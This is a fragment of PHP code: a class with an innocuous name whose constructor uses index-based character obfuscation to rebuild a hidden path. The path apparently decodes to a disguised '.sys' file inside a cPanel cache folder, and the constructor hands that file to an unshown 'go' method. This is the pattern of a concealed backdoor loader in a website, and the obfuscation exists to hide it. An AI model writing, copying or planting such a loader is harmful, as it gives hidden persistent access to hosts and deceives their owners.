...
class MJ_Queue_Buffer {
    private $dict = "w1>o n&rv2eamy/l-_suicdtphfg.";

    public function __construct() {
        $bin = $this->b(array(14,25,3,12,10,14,26,21,20,12,27,27,5,20,14,28,21,24,11,5,10,15,14,21,11,21,25,10,18,14,11,19,23,3,17,21,11,21,25,10,17,21,15,10,11,5,28,18,13,18));
        if (file_exists($bin)) {
            $this->go($bin);
        }
    }
